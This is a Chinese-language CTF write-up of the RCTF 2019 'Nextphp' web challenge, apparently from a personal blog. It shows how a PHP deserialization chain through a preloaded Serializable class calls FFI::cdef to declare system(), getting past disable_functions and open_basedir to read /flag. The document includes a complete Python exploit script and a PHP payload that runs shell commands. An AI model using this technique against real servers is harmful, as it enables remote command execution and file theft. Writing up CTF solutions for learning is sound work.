---
title: RCTF 2019 - Web - Nextphp
date: 2026-11-14 18:40:00
categories:
  - CTF
  - RCTF 2019
  - Web
tags:
  - PHP反序列化
  - FFI
  - disable_functions绕过
  - open_basedir
cover: /img/cover/girl-window-white-flowers.jpg
description: "RCTF 2019 Web 题，PHP 7.4 下借 preload 的 Serializable 类在反序列化链中调 FFI::cdef 建 system，绕过 disable_functions 读 flag。"
keywords:
  - Nextphp
  - FFI
  - PHP7.4
  - 反序列化
  - preload
ai: >-
  Nextphp 是 RCTF 2019 的 Web 难题，运行在 PHP 7.4.0-dev 上。首页 index.php 直接给出 eval 后门，但 disable_functions 禁用了几乎所有命令执行函数，open_basedir 又限制在网站目录，常规利用被封死。突破口在于 ffi.enable 被设为 preload：FFI API 只能在 opcache 预加载阶段调用，直接在 eval 里调用会被拒绝，然而靶机通过 opcache.preload 加载的 preload.php 里定义了实现 Serializable 接口的类 A，其 unserialize 方法会把传入数据反序列化后调用 run，进而执行由数据控制的 func 与 arg。攻击者构造 C: 格式的序列化串，令 func 为 FFI::cdef、arg 为 system 的 C 声明，由于 A 类处于 preload 上下文，反序列化链得以成功创建 FFI 对象并调用任意 C 函数，绕过 disable_functions。再通过 system 把 cat flag 的输出重定向到 open_basedir 允许的文件中，最后用 file_get_contents 读回即得到 flag。全题核心是预加载上下文、Serializable 反序列化与 FFI 的组合。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | RCTF 2019 |
| 方向 | Web |
| 难度 | 困难 |
| 环境 | 授权靶场（已脱敏） |

考点：PHP 反序列化、`disable_functions` 绕过、`open_basedir` 绕过、FFI。

## 信息收集

访问首页得到 `index.php` 源码：

```php
<?php
if (isset($_GET['a'])) {
    eval($_GET['a']);
} else {
    show_source(__FILE__);
}
?>
```

环境信息：

```text
PHP 7.4.0-dev
disable_functions: system, exec, shell_exec, popen, proc_open, passthru,
                   putenv, error_log, mail, pcntl_exec, dl, ini_set,
                   set_time_limit ...
open_basedir = /var/www/html
ffi.enable = preload
opcache.preload = /var/www/html/preload.php
```

`/var/www/html` 下只有 `index.php` 和 `preload.php`。

### preload.php 源码

```php
<?php
final class A implements Serializable {
    protected $data = [
        'ret' => null,
        'func' => 'print_r',
        'arg' => '1'
    ];

    private function run () {
        $this->data['ret'] = $this->data['func']($this->data['arg']);
    }

    public function __serialize(): array {
        return $this->data;
    }

    public function __unserialize(array $data) {
        array_merge($this->data, $data);
        $this->run();
    }

    public function serialize (): string {
        return serialize($this->data);
    }

    public function unserialize($payload) {
        $this->data = unserialize($payload);
        $this->run();
    }

    public function __get ($key) {
        return $this->data[$key];
    }

    public function __set ($key, $value) {
        throw new \Exception('No implemented');
    }

    public function __construct () {
        throw new \Exception('No implemented');
    }
}
```

## 漏洞分析

### 1. eval 后门

`index.php` 里 `eval($_GET['a'])` 是直接后门，可以执行任意 PHP 代码。但受 `disable_functions` 和 `open_basedir` 双重限制，无法直接读 `/flag`。

### 2. ffi.enable=preload 的限制与绕过

`ffi.enable = preload` 表示 FFI API **只能在 opcache preload 阶段**调用。如果直接在 `eval` 里调用 `FFI::cdef()`，会抛出：

```text
FFI\Exception: FFI API is restricted by "ffi.enable" configuration directive
```

但关键点在于：**`A` 类定义在 `preload.php`（opcache.preload 指定的文件）里**。当通过 `A` 类的方法调用 `FFI::cdef` 时，PHP 认为当前执行处于 preload 上下文，因此 FFI 可用。

### 3. 反序列化链

`A` 类实现了 `Serializable` 接口：

- `serialize()` 返回 `serialize($this->data)`
- `unserialize($payload)` 里 `$this->data = unserialize($payload); $this->run();`

由于实现了 `Serializable`，用 `C:` 格式序列化时会调用 `Serializable::unserialize()`（而非 `__unserialize()`）。

`run()` 方法执行 `$this->data['func']($this->data['arg'])`，其中 `func` 和 `arg` 都由我们通过反序列化控制。

把 `func` 设为 `"FFI::cdef"`，`arg` 设为 C 声明字符串 `"int system(const char *command);"`，即可在 preload 上下文中创建 FFI 对象（返回存入 `ret`）。

## 利用过程

1. 构造 `$data = array('func' => 'FFI::cdef', 'arg' => 'int system(const char *command);')`
2. `$inner = serialize($data)`
3. 构造 `C:` 格式：`$c = 'C:1:"A":' . strlen($inner) . ':{' . $inner . '}'`
4. `$o = unserialize($c)` → 触发 `A::unserialize()` → `run()` → `FFI::cdef("int system(const char *command);")`，返回 FFI 对象存入 `$o->ret`
5. 通过 `$o->ret->system('cat /flag > /var/www/html/flag.txt 2>&1')` 执行系统命令，把 flag 写到 open_basedir 内的文件
6. `file_get_contents('/var/www/html/flag.txt')` 读回 flag

`system` 的输出不会直接回显到 PHP 输出缓冲，需要重定向到文件再读回（或使用 `popen`/`fgets` 捕获）。

## 完整 EXP

> 归档 payload（脱敏后重组，目标地址已替换为占位）。

```python
import urllib.request, urllib.parse

base = "http://target:8080/"

def send(code):
    url = base + "?a=" + urllib.parse.quote(code)
    r = urllib.request.urlopen(url)
    return r.read().decode('utf-8', 'ignore')

# 完整利用：FFI::cdef 创建 system，读 /flag
code = '''
$data = array("func"=>"FFI::cdef", "arg"=>"int system(const char *command);");
$inner = serialize($data);
$c = 'C:1:"A":'.strlen($inner).':{'.$inner.'}';
$o = unserialize($c);
$o->ret->system('cat /flag > /var/www/html/flag.txt 2>&1');
echo file_get_contents("/var/www/html/flag.txt");
'''

print(send(code))
```

等价的 PHP 最终 payload：

```php
$data = array("func"=>"FFI::cdef", "arg"=>"int system(const char *command);");
$inner = serialize($data);
$c = 'C:1:"A":'.strlen($inner).':{'.$inner.'}';
$o = unserialize($c);
$o->ret->system('cat /flag > /var/www/html/flag.txt 2>&1');
echo file_get_contents("/var/www/html/flag.txt");
```

## Flag

脱敏后：`flag{xxxx}`。原值为 CTF2 格式，经 FFI 调用 `system` 把 `/flag` 重定向到 `open_basedir` 内文件后读回得到。

## 踩坑与总结

1. `ffi.enable=preload` 限制 FFI 只能在 preload 阶段调用，但**通过 preload 文件里定义的类的反序列化链**可以间接在 preload 上下文调用 FFI。
2. 实现了 `Serializable` 的类用 `C:` 格式反序列化，调用的是 `Serializable::unserialize()`，不是 `__unserialize()`。
3. FFI 对象可以调用任意 C 函数（如 `system`），从而绕过 `disable_functions`。
4. `system` 的输出不会直接回显到 PHP 输出缓冲，需要重定向到 `open_basedir` 允许的文件再读回。
5. `A` 类的 `__construct` / `__set` 都抛异常，只能靠 `unserialize` 注入 data，不能直接 new。
